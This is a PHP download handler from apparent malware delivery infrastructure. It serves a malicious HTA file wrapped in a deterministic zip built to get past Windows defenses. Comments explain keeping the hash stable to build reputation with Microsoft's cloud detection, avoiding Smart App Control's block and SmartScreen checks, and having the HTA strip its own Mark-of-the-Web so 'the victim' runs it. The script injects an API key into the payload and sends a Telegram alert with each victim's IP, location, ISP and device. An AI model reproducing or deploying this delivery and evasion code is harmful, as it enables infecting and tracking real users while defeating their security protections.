<?php
require __DIR__ . '/../lib.php';

// ============================================================
//  The actual download. Serves the SAME byte-identical .zip on
//  every download: fixed inner name, fixed zip timestamps, fixed
//  content. A stable SHA-256 lets the file accumulate clean
//  prevalence/reputation in Microsoft's cloud detection; rotating
//  the hash per download makes EVERY copy a first-seen file, which
//  is exactly what gets flagged.
//  The OUTER filename still rotates per visit (cosmetic realism) —
//  filename does not affect the hash.
//  The zip wrapper also evades Windows Smart App Control's
//  dangerous-extension block for .hta downloads (a .zip is not
//  blocked) and drops the SmartScreen publisher check that a
//  directly-downloaded unsigned .hta triggers.
// ============================================================

$tok = gate_dl();

// ---- name for THIS download (fixed by the visit, not by this request) ----
$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
// Served file is a .zip; entry inside keeps the .hta name (that's what
// the victim runs after extracting).
$zipName = str_replace('.hta', '.zip', $name);

// ---- read source HTA (byte-identical on every download; the HTA strips
//      its own Mark-of-the-Web at runtime, so no per-copy mutation is
//      needed for unblocking) ----
$src = SOURCE_ZIP;
if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
$bytes = (string)@file_get_contents($src);
if ($bytes === '') { http_response_code(500); echo '500'; exit; }
$levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
if ($levelKey !== '') {
    $i = strpos($bytes, '@@LEVEL_KEY@@');
    if ($i !== false) {
        $bytes = substr($bytes, 0, $i) . $levelKey
              . substr($bytes, $i + strlen('@@LEVEL_KEY@@'));
    }
}

// ---- wrap the HTA in a DETERMINISTIC .zip (in-memory): fixed entry name,
//      fixed DOS timestamp, no extra fields -> same outer SHA-256 always. ----
$innerName = basename($src);
$bytes = build_zip($innerName, $bytes);

// ---- one Telegram alert per real served download (deduped by visit) ----
$key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g = geo(ip());
    $msg = "\x{1F4E5} Download Served \x{1F4E5}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $zipName . " (" . round(strlen($bytes) / 1048576, 2) . " MB)\n"
         . "\x{1F501} SHA256: " . substr(hash('sha256', $bytes), 0, 16) . "...\n"
         . "\x{1F4F1} Device: " . ua()
         . (function_exists('verdict_line') ? verdict_line($tok) : '');
    tg($msg);
}

// ---- serve ----
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $zipName . '"');
header('Expires: 0');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Content-Length: ' . strlen($bytes));
echo $bytes;
exit;

// ---- zip builder: DETERMINISTIC manual construction. A single-entry zip
//      is 30-byte local header + data + 46-byte central entry + 22-byte
//      EOCD. Every field is a constant (fixed name, fixed DOS timestamp
//      2024-01-01 00:00:00, store method 0) except the CRC-32 of the
//      payload — so the archive is byte-identical (same SHA-256) on every
//      call. No ZipArchive: libzip may inject OS-version/time extra fields
//      that differ run-to-run; manual bytes never do.
function build_zip(string $innerName, string $inner): string {
    $crc  = (int)crc32($inner) & 0xFFFFFFFF;
    $size = strlen($inner);
    $nameBytes = $innerName;
    // DOS date for 2024-01-01, time 00:00:00
    $dosTime = 0x0000;
    $dosDate = 0x5821; // 2024-01-01 = ((2024-1980)<<9) | (1<<5) | 1
    $dosTimeL = chr($dosTime & 0xFF) . chr(($dosTime >> 8) & 0xFF);
    $dosDateL = chr($dosDate & 0xFF) . chr(($dosDate >> 8) & 0xFF);
    $crcL = pack('V', $crc);
    $sizeL = pack('V', $size);

    // Local file header
    $lfh = pack('V', 0x04034b50)   // signature
          . pack('v', 20)          // version needed to extract
          . pack('v', 0)           // flags
          . pack('v', 0)           // method: store (no compression, max compat)
          . $dosTimeL . $dosDateL
          . $crcL
          . $sizeL . $sizeL        // compressed / uncompressed size
          . pack('v', strlen($nameBytes))
          . pack('v', 0)           // extra field length
          . $nameBytes;

    // Central directory file header
    $cdir = pack('V', 0x02014b50)
           . pack('v', 20)         // version made by (DOS)
           . pack('v', 20)         // version needed to extract
           . pack('v', 0)          // flags
           . pack('v', 0)          // method
           . $dosTimeL . $dosDateL
           . $crcL
           . $sizeL . $sizeL
           . pack('v', strlen($nameBytes))
           . pack('v', 0)          // extra length
           . pack('v', 0)          // comment length
           . pack('v', 0)          // disk number start
           . pack('v', 0)          // internal attrs
           . pack('V', 0)          // external attrs
           . pack('V', 0)          // local header offset
           . $nameBytes;

    $cdirOff = strlen($lfh) + $size;
    // End of central directory
    $eocd = pack('V', 0x06054b50)
           . pack('v', 0)          // disk number
           . pack('v', 0)          // disk with central dir
           . pack('v', 1)          // entries this disk
           . pack('v', 1)          // total entries
           . pack('V', strlen($cdir))
           . pack('V', $cdirOff)
           . pack('v', 0);         // comment length

    return $lfh . $inner . $cdir . $eocd;
}
